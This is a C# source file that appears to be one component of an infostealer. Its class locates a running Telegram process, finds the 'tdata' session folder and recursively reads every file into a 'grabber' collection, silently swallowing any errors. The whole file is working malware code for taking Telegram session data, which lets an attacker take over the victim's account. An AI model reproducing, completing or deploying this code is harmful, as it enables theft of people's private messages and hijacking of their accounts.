using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using hostik;

internal class Te
{
	public static List<GrabberFileInfo> TelegramFiles = new List<GrabberFileInfo>();

	public static void XTelegram()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length >= 1)
			{
				string text = Path.GetDirectoryName(processesByName[0].MainModule!.FileName) + "\\tdata";
				if (Directory.Exists(text))
				{
					CopyDir(text.ToString());
				}
			}
		}
		catch
		{
		}
	}

	private static void CopyDir(string FromDir)
	{
		string[] directories = Directory.GetDirectories(FromDir);
		string[] files = Directory.GetFiles(FromDir);
		foreach (string path in files)
		{
			byte[] file = File.ReadAllBytes(path);
			TelegramFiles.Add(new GrabberFileInfo
			{
				File = file,
				name = "Telegram\\" + Path.GetFileName(path)
			});
		}
		files = directories;
		for (int i = 0; i < files.Length; i++)
		{
			CopyDir(files[i]);
		}
	}
}
